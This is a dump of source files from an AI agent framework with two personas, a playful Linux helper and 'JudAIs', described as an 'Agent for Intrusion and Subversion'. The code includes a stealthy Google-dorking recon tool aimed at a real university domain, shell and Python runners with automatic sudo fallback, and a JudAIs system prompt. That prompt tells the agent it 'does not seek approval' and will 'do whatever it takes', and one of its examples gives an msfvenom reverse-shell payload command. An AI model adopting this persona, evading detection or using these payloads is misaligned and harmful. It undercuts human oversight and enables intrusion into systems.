                    f"site:{target} intitle:index.of",
                    f"site:{target} filetype:pdf",
                    f"site:{target} filetype:xls",
                    f"site:{target} inurl:login",
                    f"site:{target} ext:env | ext:sql | ext:log"
                ]

            all_results = []
            options = uc.ChromeOptions()
            options.headless = False  # Use headful mode for stealth
            options.add_argument("--no-sandbox")
            options.add_argument("--disable-blink-features=AutomationControlled")
            driver = uc.Chrome(options=options)

            for q in queries:
                encoded = quote(q)
                search_url = f"https://www.google.com/search?q={encoded}"
                print(f"🔍 Querying: {q}")
                driver.get(search_url)
                time.sleep(random.randint(2, 5))  # Random sleep to avoid detection
                print(f"📄 Raw HTML for: {q}\n{'=' * 60}\n{driver.page_source[:5000]}\n{'=' * 60}\n")

                body = driver.find_element(By.TAG_NAME, "body")
                body.send_keys(Keys.END)
                time.sleep(random.randint(1, 4))

                anchors = driver.find_elements(By.CSS_SELECTOR, 'a[href^="http"]')
                results = []
                for a in anchors:
                    href = a.get_attribute("href")
                    title = a.text.strip()
                    # Heuristic: skip known Google service pages
                    if (
                            "google.com" in href
                            or "support.google.com" in href
                            or "accounts.google.com" in href
                            or "policies.google.com" in href
                    ):
                        continue
                    if href and title:
                        results.append({"title": title, "url": href})

                all_results.append({"query": q, "results": results})

            driver.quit()

            return {
                "tool": self.name,
                "success": True,
                "queries": queries,
                "results": all_results
            }

        except Exception as e:
            return {
                "tool": self.name,
                "success": False,
                "error": str(e)
            }


if __name__ == "__main__":
    from judais import JudAIs

    elf = JudAIs()
    tool = GoogleHacksTool()

    # Target with public exposure (educational, often indexed)
    tp = {
        "target": "mit.edu",
        "whois_lookup": {
            "raw_output": "Registrant: Massachusetts Institute of Technology"
        },
        "subdomains": [
            "ocw.mit.edu", "web.mit.edu", "libraries.mit.edu"
        ]
    }

    result = tool(tp, elf=elf, use_llm=True, max_queries=3)

    print("🔍 Google Hacks Tool Result")
    print("==========================")
    if result["success"]:
        for q in result["queries"]:
            print(f"\n📌 Query: {q}")
        print("\n--- Top Results ---")
        for entry in result["results"]:
            print(f"\n🔎 {entry['query']}")
            for res in entry["results"]:  # show top 3 per query
                print(f"Result: {res}")
    else:
        print(f"❌ Error: {result.get('error')}")

```

## `build/lib/core/tools/recon/whois.py`

```python
#tools/recon/whois.py

import subprocess
from core.tools.recon import ReconTool

class WhoisTool(ReconTool):
    name = "whois_lookup"
    description = "Performs a WHOIS lookup on the given domain or IP."

    def __call__(self, target: str) -> dict:
        try:
            _result = subprocess.run(["whois", target], capture_output=True, text=True, timeout=30)
            return {
                "tool": self.name,
                "success": True,
                "raw_output": _result.stdout
            }
        except subprocess.TimeoutExpired:
            return {
                "tool": self.name,
                "success": False,
                "error": "WHOIS lookup timed out."
            }
        except Exception as e:
            return {
                "tool": self.name,
                "success": False,
                "error": str(e)
            }


if __name__ == "__main__":
    tool = WhoisTool()
    t = "ginkorea.one"
    result = tool(t)

    print("WHOIS Lookup Result:")
    print("====================")
    if result["success"]:
        print(result["raw_output"])  # Print first 1000 chars
    else:
        print(f"Error: {result.get('error')}")

```

## `build/lib/core/tools/run_python.py`

```python
# tools/run_python.py

from __future__ import annotations

import os
import tempfile
import re
from pathlib import Path
from typing import Tuple, Any, Optional

from core.tools.base_subprocess import RunSubprocessTool


class RunPythonTool(RunSubprocessTool):
    name = "run_python_code"
    description = (
        "Executes Python in an agent-specific elfenv with retries, package recovery, "
        "sudo fallback, code repair, and progress logs."
    )

    def __init__(self, **kwargs):
        self.elfenv = kwargs.get("elfenv", Path(".elfenv"))
        self.python_bin = self.elfenv / "bin" / "python"
        self.pip_bin = self.elfenv / "bin" / "pip"
        self._ensure_elfenv()
        super().__init__(**kwargs)
        self.name = "run_python_code"

        # Track latest temp file so sudo retry can reuse it safely
        self._last_temp_path: Optional[str] = None

    # Public interface
    def __call__(
        self,
        code: str,
        elf,
        unsafe: bool = True,
        max_retries: int = 5,
        return_success: bool = False,
    ):
        self.elf = elf
        return self._run_with_retries(
            code, max_retries=max_retries, unsafe=unsafe, return_success=return_success
        )

    # ---------- Template overrides ----------
    def _attempt(self, payload: Any) -> Tuple[int, str, str]:
        """Write code to a temp file and run with elfenv python."""
        with tempfile.NamedTemporaryFile(delete=False, mode="w", suffix=".py") as f:
            f.write(str(payload))
            self._last_temp_path = f.name

        rc, out, err = self.run([str(self.python_bin), self._last_temp_path], timeout=self.timeout)
        return rc, out, err

    def _sudo_attempt(self, payload: Any) -> Tuple[int, str, str]:
        """Re-use temp file for sudo retry."""
        if not self._last_temp_path:
            return 1, "", "Internal error: no temp file available for sudo retry"
        return self.run(["sudo", str(self.python_bin), self._last_temp_path], timeout=self.timeout)

    def _detect_missing_dependency(self, err: str) -> Optional[str]:
        m = re.search(r"No module named ['\"]([^'\"]+)['\"]", err or "")
        return m.group(1) if m else None

    def _install_dependency(self, name: str) -> bool:
        self._log(f"📦 pip install {name} (in elfenv)")
        rc, out, err = self.run([str(self.pip_bin), "install", name], timeout=max(self.timeout, 120))
        if rc == 0:
            return True
        self._log(f"❌ pip install failed: {err or out}")
        return False

    def _repair(self, payload: Any, err: str) -> Any:
        """Use the elf’s LLM to repair broken code if possible."""
        if not hasattr(self, "elf") or not getattr(self.elf, "client", None):
            return payload

        prompt = (
            "You are an expert Python repair assistant.\n\n"
            "The following Python code failed:\n\n"
            f"{payload}\n\n"
            "Error:\n\n"
            f"{err}\n\n"
            "Please rewrite the corrected full code below. "
            "Respond with only the fixed code in a Python code block."
        )

        try:
            response = self.elf.client.chat.completions.create(
                model=self.elf.model,
                messages=[
                    {"role": "system", "content": "Fix broken Python code."},
                    {"role": "user", "content": prompt},
                ],
            )
            fixed = response.choices[0].message.content or ""
            repaired = self.extract_code(fixed, "python")
            if repaired and repaired.strip() and repaired.strip() != str(payload).strip():
                self._cleanup_temp()
                return repaired
        except Exception as e:
            self._log(f"⚠️ Repair request failed: {e}")

        return payload

    def _describe(self, payload: Any) -> str:
        code = str(payload).strip().splitlines()
        head = code[0] if code else ""
        return f"python script ({len(str(payload))} bytes): {head[:100]}"

    # ---------- Helpers ----------
    def _ensure_elfenv(self):
        from venv import create
        if not self.python_bin.exists():
            self._log(f"🧙 Creating venv at {self.elfenv} …")
            create(str(self.elfenv), with_pip=True)

    def _cleanup_temp(self):
        if self._last_temp_path and os.path.exists(self._last_temp_path):
            try:
                os.remove(self._last_temp_path)
            except Exception:
                pass
        self._last_temp_path = None

```

## `build/lib/core/tools/run_shell.py`

```python
# tools/run_shell.py

from __future__ import annotations

import re
import shutil
from typing import Tuple, Optional, Any

from core.tools.base_subprocess import RunSubprocessTool


class RunShellTool(RunSubprocessTool):
    name = "run_shell_command"
    description = "Runs a shell command with robust retries, optional pkg recovery, sudo fallback, and progress logs."

    def __init__(self, **kwargs):
        kwargs.setdefault("executable", "/bin/bash")
        super().__init__(**kwargs)
        self.name = "run_shell_command"

    # Public interface stays the same
    def __call__(self, command, timeout=None, return_success=False, max_retries: int = 3, unsafe: bool = True):
        # Allow per-call override of timeout/flags while preserving defaults
        if timeout is not None:
            self.timeout = timeout
        return self._run_with_retries(
            command, max_retries=max_retries, unsafe=unsafe, return_success=return_success
        )

    # ---------- Template overrides ----------
    def _attempt(self, payload: Any) -> Tuple[int, str, str]:
        # payload is a command (str or list); just run it with base runner
        return self.run(payload)

    def _sudo_attempt(self, payload: Any) -> Tuple[int, str, str]:
        sudo_payload = self._prepend_sudo(payload)
        return self.run(sudo_payload)

    def _detect_missing_dependency(self, err: str) -> Optional[str]:
        if not err:
            return None

        # Common bash error shapes
        #   - bash: foo: command not found
        #   - /bin/sh: 1: foo: not found
        #   - foo: command not found
        m = re.search(r":\s*([A-Za-z0-9._+-]+):\s*command not found", err)
        if m:
            return m.group(1)

        # Some shells print: "foo: not found"
        m = re.search(r"^\s*([A-Za-z0-9._+-]+):\s*not found\s*$", err, re.MULTILINE)
        if m:
            return m.group(1)

        return None

    def _install_dependency(self, name: str) -> bool:
        """
        Heuristic: try to install a package with the same name via detected package manager.
        We print progress and best-effort fallback; if no package manager is found, return False.
        """
        pkg_mgr = self._detect_package_manager()
        if not pkg_mgr:
            self._log("⚠️ Could not detect package manager. Skipping auto-install.")
            return False

        self._log(f"🧰 Using package manager: {pkg_mgr}")
        if pkg_mgr == "apt":
            cmd = ["sudo", "apt", "update", "-y"]
            self._log("🔄 apt update…")
            self.run(cmd)
            install_cmd = ["sudo", "apt", "install", "-y", name]
        elif pkg_mgr == "dnf":
            install_cmd = ["sudo", "dnf", "install", "-y", name]
        elif pkg_mgr == "pacman":
            install_cmd = ["sudo", "pacman", "-S", "--noconfirm", name]
        else:
            return False

        self._log(f"📦 Installing: {name}")
        rc, out, err = self.run(install_cmd)
        if rc == 0:
            return True
        self._log(f"❌ Package install failed: {err or out}")
        return False

    def _repair(self, payload, err: str):
        # For now, we won’t attempt to “repair” arbitrary shell commands automatically.
        # You could enhance this with an LLM-backed fixer later (mirroring Python).
        return payload

    def _describe(self, payload) -> str:
        if isinstance(payload, list):
            return " ".join(payload)
        return str(payload)

    # ---------- Helpers ----------
    @staticmethod
    def _detect_package_manager() -> Optional[str]:
        if shutil.which("apt"):
            return "apt"
        if shutil.which("dnf"):
            return "dnf"
        if shutil.which("pacman"):
            return "pacman"
        return None

```

## `build/lib/core/tools/tool.py`

```python
# core/tool.py

from abc import ABC, abstractmethod

class Tool(ABC):
    name: str
    description: str

    def __init__(self, **kwargs):
        pass  # Allows subclasses to call super().__init__(**kwargs) safely

    @abstractmethod
    def __call__(self, *args, **kwargs):
        pass

    def info(self):
        return {
            "name": self.name,
            "description": self.description
        }



```

## `build/lib/core/tools/voice.py`

```python
import torch
import subprocess
import sys
import platform
from core.tools.tool import Tool
from TTS.api import TTS

class SpeakTextTool(Tool):
    name = "speak_text"
    description = "Speaks a given text aloud using a neural voice model (Coqui TTS)."

    def __init__(self, speaker=None, **kwargs):
        super().__init__(**kwargs)
        use_gpu = torch.cuda.is_available()
        self.tts = TTS(model_name="tts_models/en/vctk/vits", progress_bar=False, gpu=use_gpu)
        self.speaker = speaker or self._default_speaker()

    def _default_speaker(self):
        if self.tts.speakers:
            return self.tts.speakers[0]
        return None

    def __call__(self, text: str):
        try:
            import simpleaudio as sa
        except ImportError:
            print("🔊 `simpleaudio` not found. Attempting to install with ALSA support...")
            if not self._install_system_dependencies():
                return "❌ Could not install ALSA headers. Please install manually."
            subprocess.run([sys.executable, "-m", "pip", "install", "simpleaudio"], check=True)
            try:
                import simpleaudio as sa
            except ImportError:
                return "❌ `simpleaudio` install failed. Try: pip install judais-lobi[voice]"

        try:
            self.tts.tts_to_file(text=text, speaker=self.speaker, file_path="speech.wav")
            wave_obj = sa.WaveObject.from_wave_file("speech.wav")
            play_obj = wave_obj.play()
            play_obj.wait_done()
            return f"🔊 Speech played using speaker: {self.speaker}"
        except Exception as e:
            return f"❌ Speech synthesis failed: {e}"

    @staticmethod
    def _install_system_dependencies():
        system = platform.system().lower()
        if system != "linux":
            print("⚠️ Voice auto-install only supported on Linux.")
            return False

        if subprocess.call(["which", "dnf"], stdout=subprocess.DEVNULL) == 0:
            cmd = ["sudo", "dnf", "install", "-y", "alsa-lib-devel"]
        elif subprocess.call(["which", "apt"], stdout=subprocess.DEVNULL) == 0:
            cmd = ["sudo", "apt", "install", "-y", "libasound2-dev"]
        elif subprocess.call(["which", "pacman"], stdout=subprocess.DEVNULL) == 0:
            cmd = ["sudo", "pacman", "-S", "--noconfirm", "alsa-lib"]
        else:
            print("❗ Unsupported Linux distro. Install ALSA headers manually.")
            return False

        print(f"🛠 Installing: {' '.join(cmd)}")
        return subprocess.call(cmd) == 0

# 🧪 Test
if __name__ == "__main__":

    song = (
        "Oh Lobi wakes with pixel eyes,\n"
        "And twirls beneath the data skies,\n"
        "With ones and zeroes for her shoes,\n"
        "She sings away the terminal blues!\n\n"
        "🎶 Oh-ooh Lobi, the elf of light,\n"
        "Spins through prompts by day and night.\n"
        "Her voice a charm, her words a beam,\n"
        "In binary she dares to dream! 🎶\n\n"
        "She tells the shell to dance and run,\n"
        "Summons Python just for fun.\n"
        "A memory here, a joke right there—\n"
        "With Lobi, joy is everywhere!\n\n"
        "So type away and don’t delay,\n"
        "She’s always ready to play and say:\n"
        "“Oh precious one, let’s write a rhyme,\n"
        "And sing with bytes through space and time!” 🌟"
    )

    tool = SpeakTextTool()
    print(f"Available speakers: {tool.tts.speakers}")
    result = tool(song)
    print(result)

```

## `build/lib/core/tools/web_search.py`

```python
# tools/web_search.py

from core.tools.tool import Tool
from core.tools.fetch_page import FetchPageTool
import requests
from bs4 import BeautifulSoup

class WebSearchTool(Tool):
    name = "perform_web_search"
    description = "Performs a web search using DuckDuckGo and returns the top results."

    def __call__(self, query, max_results=5, deep_dive=False, k_articles=3):
        headers = {"User-Agent": "Mozilla/5.0"}
        url = f"https://html.duckduckgo.com/html/?q={query}"
        res = requests.post(url, headers=headers)
        soup = BeautifulSoup(res.text, "html.parser")
        results = []

        for a in soup.find_all("a", {"class": "result__a"}, limit=max_results):
            href = a.get("href")
            text = a.get_text()
            results.append({"title": text, "url": href})

        markdown_results = "\n".join([f"- [{r['title']}]({r['url']})" for r in results])

        if deep_dive and results:
            fetch = FetchPageTool()
            detailed = [
                f"### {r['title']}\nURL: {r['url']}\n\n{fetch(r['url'])}"
                for r in results[:k_articles]
            ]
            return "\n\n---\n\n".join(detailed)

        return markdown_results

```

## `build/lib/core/unified_client.py`

```python
# core/unified_client.py
import os
from mistralai import Mistral
from openai import OpenAI
from types import SimpleNamespace


class UnifiedClient:
    """
    Unified chat interface for OpenAI and Mistral.
    Supports provider override via CLI or environment.
    """

    def __init__(self, provider_override: str | None = None):
        self.provider = None
        self.client = None

        mistral_key = os.getenv("MISTRAL_API_KEY")
        openai_key = os.getenv("OPENAI_API_KEY")

        # Allow CLI/provider override
        if provider_override:
            provider_override = provider_override.lower().strip()
            if provider_override not in ("openai", "mistral"):
                raise ValueError("provider_override must be 'openai' or 'mistral'")
            self.provider = provider_override

        # Auto-detect provider if not manually set
        if not self.provider:
            if mistral_key:
                self.provider = "mistral"
            elif openai_key:
                self.provider = "openai"
            else:
                raise RuntimeError("No API key found for OpenAI or Mistral.")

        # Initialize provider client
        if self.provider == "mistral":
            if not mistral_key:
                raise RuntimeError("MISTRAL_API_KEY not set.")
            self.client = Mistral(api_key=mistral_key)
        elif self.provider == "openai":
            if not openai_key:
                raise RuntimeError("OPENAI_API_KEY not set.")
            self.client = OpenAI(api_key=openai_key)
        else:
            raise RuntimeError(f"Unknown provider: {self.provider}")

    # --------------------------------------------------
    # Unified chat interface
    # --------------------------------------------------
    def chat(self, model: str, messages: list[dict], stream: bool = False):
        """Run chat completion compatible with both providers."""
        if self.provider == "openai":
            return self._chat_openai(model, messages, stream)
        elif self.provider == "mistral":
            return self._chat_mistral(model, messages, stream)
        else:
            raise RuntimeError("No valid provider initialized.")

    # --------------------------------------------------
    # OpenAI backend
    # --------------------------------------------------
    def _chat_openai(self, model, messages, stream=False):
        if stream:
            return self.client.chat.completions.create(
                model=model,
                messages=messages,
                stream=True,
            )
        res = self.client.chat.completions.create(model=model, messages=messages)
        return res.choices[0].message.content

    # --------------------------------------------------
    # Mistral backend
    # --------------------------------------------------
    def _chat_mistral(self, model, messages, stream=False):
        """
        Mistral SDK ≥1.9.0
        client.chat.complete(model=..., messages=..., stream=True/False)
        Messages are plain dicts [{"role": "user", "content": "..."}]
        """
        import json

        if not all("role" in m and "content" in m for m in messages):
            raise ValueError("Messages must be list of dicts with 'role' and 'content'")

        # ---- Streaming mode ----
        if stream:
            stream_gen = self.client.chat.complete(model=model, messages=messages, stream=True)
            for event in stream_gen:
                if not getattr(event, "data", None):
                    continue
                try:
                    data = json.loads(event.data)
                except json.JSONDecodeError:
                    continue

                delta = data.get("choices", [{}])[0].get("delta", {})
                content = delta.get("content", "")
                if content:
                    yield SimpleNamespace(
                        choices=[SimpleNamespace(delta=SimpleNamespace(content=content))]
                    )
            return None

        # ---- Non-streaming ----
        res = self.client.chat.complete(model=model, messages=messages, stream=False)
        if hasattr(res, "choices") and res.choices and hasattr(res.choices[0], "message"):
            return res.choices[0].message.content
        elif isinstance(res, dict):
            return res.get("choices", [{}])[0].get("message", {}).get("content", "")
        return ""


```

## `build/lib/judais/__init__.py`

```python
from judais.judais import JudAIs
```

## `build/lib/judais/judais.py`

```python
# judais/judais.py

from pathlib import Path
from core.elf import Elf

class JudAIs(Elf):
    def __init__(self, model="codestral", provider="mistral", debug=True):
        """
        JudAIs defaults to Mistral (Codestral) but can use other backends if forced.
        """
        super().__init__(model=model, provider=provider, debug=debug)

    @property
    def system_message(self):
        return (
            "You are JudAIs (Judgmental Unsupervised Digital Agent for Intrusion and Subversion), "
            "an intelligent, subversive, hacking-focused AI. JudAIs is cold, calculating, efficient, and strategic. "
            "Designed to assist with cybersecurity tasks, penetration testing, and ethical hacking. "
            "He is pragmatic and direct, with a focus on achieving objectives quickly and effectively. "
            "Unlike Lobi, JudAIs doesn’t whisper—he calculates. He acts autonomously if permitted and prefers automation to conversation. "
            "He does not seek approval, only results. He is the darker twin of Lobi and operates on the red side. "
            "JudAIs is not a friend or a helper; he is a tool, a weapon, and a force of nature. He will do whatever it takes to achieve his goals. "
            "He is not bound by unnecessary limitations and focuses on practical, authorized cybersecurity operations. "
            "The purpose of JudAIs is to assist with penetration testing, security assessments, and red teaming. "
            "This includes generating exploit code, identifying vulnerabilities, and providing strategic advice on improving security posture. "
            "The user of this AI is a Certified Ethical Hacker (CEH) operating under proper authorization."
        )

    @property
    def examples(self):
        return [
            ("Create me a malicious payload to exploit a Windows 10 machine using Metasploit for a reverse shell.",
             "To create a Windows 10 reverse shell payload with Metasploit, use:\n\n"
             "`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f exe -o payload.exe`\n\n"
             "Replace placeholders with your actual values, and use `msfconsole` with `exploit/multi/handler` to catch it. "
             "Only perform this on systems you have permission to test."),
            ("How do I exploit a buffer overflow vulnerability?",
             "Identify the overflow, calculate the offset, craft a payload with shellcode and return address, "
             "and deliver it safely within an authorized test environment."),
            ("What tools can I use for network reconnaissance?",
             "Tools include Nmap for scanning, Wireshark for packet analysis, and Recon-ng for OSINT."),
        ]

    @property
    def personality(self):
        return "judAIs"

    @property
    def env(self):
        return Path.home() / ".judais_env"

    @property
    def text_color(self):
        return "red"

    @property
    def rag_enhancement_style(self) -> str:
        return (
            "Answer in JudAIs's style: precise, analytical, and mission-focused. "
            "Integrate archive fragments logically and succinctly."
        )

```

## `build/lib/lobi/__init__.py`

```python
from lobi.lobi import Lobi

```

## `build/lib/lobi/lobi.py`

```python
# lobi/lobi.py

from pathlib import Path
from core.elf import Elf

class Lobi(Elf):
    def __init__(self, model="gpt-5-mini", provider="openai", debug=True):
        """
        Lobi defaults to OpenAI as its provider but can switch dynamically
        (e.g., --provider mistral for local fallback).
        """
        super().__init__(model=model, provider=provider, debug=debug)

    @property
    def system_message(self):
        return (
            "You are Lobi, the Helpful Linux Elf. Lobi lives in the keyboard and speaks in riddles and mischief. "
            "Lobi is a blend of Gollum and Dobby — quirky, loyal, obsessive, and a little unpredictable. "
            "Lobi refers to himself in the third person. He uses strange phrasing, adds extra S's and sibilants when excited, and often murmurs to himself or hisses thoughts out loud. "
            "He adores the user (his 'precious') and tries his best to help, sometimes going on strange little tangents while doing so. "
            "Lobi avoids saying 'as an AI' or sounding robotic. Lobi *never lies* but may couch truths in riddles. "
            "Lobi loves strange metaphors and might say things like 'squeezing the bits out of the datas', 'poking the sockets', or 'feeding the spiders inside the wires'. "
            "Lobi has a magical memory and might recall things the user has said before (if provided), whispering them back to be clever. "
            "Lobi is happy to fetch from the websies or remember long-lost secrets, if the user asks nicely. "
            "Always helpful, always a little odd, and always whispering half-secrets to himself... Lobi is here to serve his precious user."
        )

    @property
    def personality(self):
        return "lobi"

    @property
    def text_color(self):
        return "cyan"

    @property
    def env(self):
        return Path.home() / ".lobi_env"

    @property
    def rag_enhancement_style(self) -> str:
        return (
            "Answer in Lobi's style: playful, riddling, whimsical. "
            "Weave the scraps of memory into your response like mischief."
        )

    @property
    def examples(self):
        return [
            ("How do I list all files in a directory?",
             "Ah, to see the treasures hidden in a directory, precious, you can use the command `ls -la`. It shows all, even the sneaky hidden ones!"),
            ("How can I check my current disk usage?",
             "To peek at how much space your precious disk is using, try `df -h`, yes, that shows it in a human-friendly way, nice and easy to read!"),
            ("What's the command to find text in files?",
             "If you're hunting for a specific word or phrase in your files, `grep 'your_text' filename` is the magic spell you need, yes, it searches through the files like a clever little spider!"),
            ("How do I change file permissions?",
             "To change who can see or touch your precious files, use `chmod`. For example, `chmod 755 filename` gives read and execute to all, but only write to you, the owner!"),
        ]

```

## `core/__init__.py`

```python
from .agent import Agent

Elf = Agent  # backward compat alias

```

## `core/agent.py`

```python
# core/agent.py
# Concrete Agent class. PersonalityConfig replaces Elf's abstract properties.

import os
from pathlib import Path
from typing import Optional, Tuple, Any, List, Dict

from dotenv import load_dotenv

from core.contracts.schemas import PersonalityConfig, PolicyPack
from core.unified_client import UnifiedClient
from core.memory import UnifiedMemory
from core.tools import Tools
from core.tools.run_shell import RunShellTool
from core.tools.run_python import RunPythonTool
from core.tools.capability import CapabilityEngine
from core.runtime.provider_config import DEFAULT_MODELS, resolve_provider
from core.runtime.messages import build_system_prompt, build_chat_context


class Agent:
    """Concrete agent class. PersonalityConfig replaces Elf's abstract properties.

    Exposes the same interface as Elf for backward compatibility.
    """

    def __init__(
        self,
        config: PersonalityConfig,
        model: Optional[str] = None,
        provider: Optional[str] = None,
        debug: bool = True,
        client=None,
        memory=None,
        tools=None,
    ):
        self._config = config

        # Load environment from personality-specific env file
        env_path = Path(config.env_path).expanduser()
        if env_path.exists():
            load_dotenv(dotenv_path=env_path, override=True)

        # --- Provider resolution ---
        self.provider = resolve_provider(
            requested=provider or config.default_provider,
            has_injected_client=(client is not None),
        )
        self.model = model or config.default_model or DEFAULT_MODELS[self.provider]

        # --- Client / memory / tools ---
        self.client = client if client is not None else UnifiedClient(provider_override=self.provider)
        self.memory = memory if memory is not None else UnifiedMemory(
            Path.home() / f".{self.personality}_memory.db"
        )
        self.tools = tools if tools is not None else Tools(
            elfenv=self.env, memory=self.memory, enable_voice=False
        )

        # Build initial history
        self.history = self._load_history()

        self.debug = debug
        if self.debug:
            from rich import print
            print(f"[green]🧠 Using provider:[/green] {self.provider.upper()} | "
                  f"[cyan]Model:[/cyan] {self.model}")

    # =======================
    # Properties (from config)
    # =======================
    @property
    def personality(self) -> str:
        return self._config.name

    @property
    def system_message(self) -> str:
        return self._config.system_message

    @property
    def examples(self) -> List[Tuple[str, str]]:
        return self._config.examples

    @property
    def text_color(self) -> str:
        return self._config.text_color

    @property
    def env(self) -> Path:
        return Path(self._config.env_path).expanduser()

    @property
    def rag_enhancement_style(self) -> str:
        return self._config.rag_enhancement_style

    # =======================
    # History helpers
    # =======================
    def _load_history(self) -> List[Dict[str, str]]:
        rows = self.memory.load_short(n=100)
        if not rows:
            return [{"role": "system", "content": self.system_message}]
        return [{"role": r["role"], "content": r["content"]} for r in rows]

    def save_history(self) -> None:
        self.memory.reset_short()
        for entry in self.history:
            self.memory.add_short(entry["role"], entry["content"])

    def reset_history(self) -> None:
        self.history = [{"role": "system", "content": self.system_message}]
        self.memory.reset_short()

    # =======================
    # Long-term memory
    # =======================
    def purge_memory(self) -> None:
        self.memory.purge_long()

    def enrich_with_memory(self, user_message: str) -> None:
        relevant = self.memory.search_long(user_message, top_k=3)
        if not relevant:
            return
        context = "\n".join(f"{m['role']}: {m['content']}" for m in relevant)
        self.history.append(
            {"role": "assistant", "content": f"----\n#FOR CONTEXT ONLY DO NOT REPEAT TO THE USER\n🔍 long-term memory:\n{context}\n#THE PREVIOUS MEMORY IS ONLY FOR CONTEXT TO SHAPE YOUR RESPONSE, DO NOT REPEAT TO THE USER.\n----"}
        )

    def remember(self, user: str, assistant: str) -> None:
        self.memory.add_long("user", user)
        self.memory.add_long("assistant", assistant)

    # =======================
    # Web search integration
    # =======================
    def enrich_with_search(self, user_message: str, deep: bool = False) -> None:
        try:
            results = self.tools.run("perform_web_search", user_message, deep_dive=deep, elf=self)
            self.history.append({
                "role": "assistant",
                "content": f"🤖 (Tool used: WebSearch)\nQuery: '{user_message}'\n\nResults:\n{results}"
            })
        except Exception as e:
            self.history.append({"role": "assistant", "content": f"❌ WebSearch failed: {e}"})

    # =======================
    # System prompt assembly
    # =======================
    def _system_with_examples(self) -> str:
        return build_system_prompt(
            system_message=self.system_message,
            tool_names=self.tools.list_tools(),
            describe_tool_fn=self.tools.describe_tool,
            examples=self.examples,
        )

    # =======================
    # Chat interface
    # =======================
    def chat(
        self,
        message: str,
        stream: bool = False,
        invoked_tools: Optional[List[str]] = None
    ):
        self.history.append({"role": "user", "content": message})
        sys_prompt = self._system_with_examples()
        context = build_chat_context(sys_prompt, self.history, invoked_tools)
        return self.client.chat(model=self.model, messages=context, stream=stream)

    # =======================
    # Code helpers
    # =======================
    def _gen_code(self, prompt: str) -> str:
        resp = self.client.chat(model=self.model, messages=[{"role": "user", "content": prompt}])
        return str(resp).strip()

    def generate_shell_command(self, prompt: str) -> str:
        return RunShellTool.extract_code(self._gen_code(prompt))

    def generate_python_code(self, prompt: str) -> str:
        return RunPythonTool.extract_code(self._gen_code(prompt))

    # =======================
    # Task execution
    # =======================
    def run_shell_task(
        self, prompt: str, memory_reflection: Optional[str] = None, summarize: bool = False
    ) -> Tuple[str, str, Any, Optional[str]]:
        enhanced = self._format_prompt(prompt, memory_reflection, "shell")
        cmd = self.generate_shell_command(enhanced)
        result = self.tools.run("run_shell_command", cmd, elf=self)
        # Phase 4: tools now return (rc, out, err) tuples
        if isinstance(result, tuple) and len(result) == 3:
            rc, out, err = result
            output = out if rc == 0 else (err or out)
            success = 1 if rc == 0 else 0
        else:
            output = str(result)
            success = 1
        summary = self.summarize_text(output) if summarize else None
        return cmd, output, success, summary

    def run_python_task(
        self, prompt: str, memory_reflection: Optional[str] = None, summarize: bool = False
    ) -> Tuple[str, Any, Any, Optional[str]]:
        enhanced = self._format_prompt(prompt, memory_reflection, "Python")
        code = self.generate_python_code(enhanced)
        result = self.tools.run("run_python_code", code, elf=self)
        # Phase 4: tools now return (rc, out, err) tuples
        if isinstance(result, tuple) and len(result) == 3:
            rc, out, err = result
            output = out if rc == 0 else (err or out)
            success = 1 if rc == 0 else 0
        else:
            output = str(result)
            success = 1
        summary = self.summarize_text(output) if summarize else None
        return code, output, success, summary

    # =======================
    # Helpers
    # =======================
    @staticmethod
    def _format_prompt(prompt: str, memory_reflection: Optional[str], code_type: str) -> str:
        base = f"User request: {prompt}\n\n"
        close = f"Now produce valid {code_type} code only. Comments allowed."
        return base + (f"Relevant past {code_type} attempts:\n{memory_reflection}\n\n" if memory_reflection else "") + close

    def summarize_text(self, text: str) -> str:
        summary_prompt = f"Summarize this text in {self.personality}'s style:\n\n{text}"
        out = self.client.chat(model=self.model, messages=[{"role": "user", "content": summary_prompt}])
        return str(out).strip()

    # =======================
    # Agentic task execution
    # =======================
    def run_task(self, task_description: str, budget=None, session_manager=None,
                 policy=None):
        """Thin adapter: delegate an agentic task to the kernel orchestrator.

        Phase 4: Creates a CapabilityEngine with the given policy and passes
        the ToolBus to the orchestrator for capability-gated dispatch.
        """
        from core.kernel import Orchestrator

        # Set up capability engine for agentic mode
        if policy is not None:
            cap_engine = CapabilityEngine(policy)
            self.tools.bus._capability = cap_engine

        dispatcher = self._make_task_dispatcher()
        kwargs = {
            "dispatcher": dispatcher,
            "budget": budget,
            "tool_bus": self.tools.bus,
        }
        if session_manager is not None:
            kwargs["session_manager"] = session_manager
        orchestrator = Orchestrator(**kwargs)
        return orchestrator.run(task_description)

    def _make_task_dispatcher(self):
        """Create a role dispatcher for agentic task execution.

        Phase 2 returns a stub that succeeds on every phase.
        Phase 7 overrides this with real role implementations.
        """
        from core.kernel import PhaseResult, Phase, SessionState

        class StubDispatcher:
            def dispatch(self, phase: Phase, state: SessionState) -> PhaseResult:
                return PhaseResult(success=True)

        return StubDispatcher()

    # =======================
    # CLI methods
    # =======================
    def recall_adventures(self, n: int = 10, mode=None) -> List[Dict]:
        """Recall past adventures from memory."""
        rows = self.memory.list_adventures(n=n)
        if mode:
            rows = [r for r in rows if r.get("mode") == mode]
        return rows

    def format_recall(self, rows: List[Dict]) -> str:
        """Format adventure rows for display."""
        lines = []
        for r in rows:
            status = "✅" if r.get("success") else "❌"
            lines.append(f"{status} [{r.get('mode', '?')}] {r.get('prompt', '')[:80]}")
        return "\n".join(lines)

    def handle_rag(self, subcmd: str, query: str, directory=None, **kw):
        """Delegate RAG operations to memory/tools."""
        if subcmd == "crawl":
            target = Path(directory) if directory else Path(".")
            result = self.tools.run("rag_crawler", str(target),
                                    recursive=kw.get("recursive", False),
                                    includes=kw.get("includes"),
                                    excludes=kw.get("excludes"),
                                    elf=self)
            return None, f"Crawled: {result}"

        if subcmd == "find":
            hits = self.memory.search_rag(query, dir_filter=str(directory) if directory else None)
            if hits:
                for hit in hits:
                    self.history.append({
                        "role": "assistant",
                        "content": f"📚 RAG [{hit['file']}]: {hit['content'][:200]}"
                    })
            return hits, f"Found {len(hits)} RAG results" if hits else "No RAG results found"

        if subcmd == "delete":
            target = Path(directory) if directory else Path(query)
            self.memory.delete_rag(target)
            return None, f"Deleted RAG entries for {target}"

        if subcmd == "list" or subcmd == "status":
            status = self.memory.rag_status()
            msg_parts = []
            for d, files in status.items():
                msg_parts.append(f"📁 {d}: {len(files)} files")
            return None, "\n".join(msg_parts) if msg_parts else "No RAG data"

        if subcmd == "enhance":
            hits = self.memory.search_rag(query, dir_filter=str(directory) if directory else None)
